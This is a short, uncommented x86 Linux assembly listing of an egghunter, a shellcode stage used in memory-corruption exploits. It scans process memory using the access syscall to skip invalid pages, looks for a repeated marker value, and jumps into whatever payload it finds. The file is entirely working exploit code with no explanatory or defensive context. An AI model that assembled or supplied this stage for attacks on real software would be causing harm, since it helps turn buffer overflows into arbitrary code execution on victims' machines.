global _start

section .text

_start:
  xor edx,edx
  
doloop:
  or dx,0xfff
  
nextaddr:  
  inc edx
  lea ebx,[edx+0x4]
  push byte +0x21
  pop eax
  int 0x80
  cmp al,0xf2
  jz doloop
  mov eax,0x50905090
  mov edi,edx
  scasd
  jnz nextaddr
  scasd
  jnz nextaddr
  jmp edi
  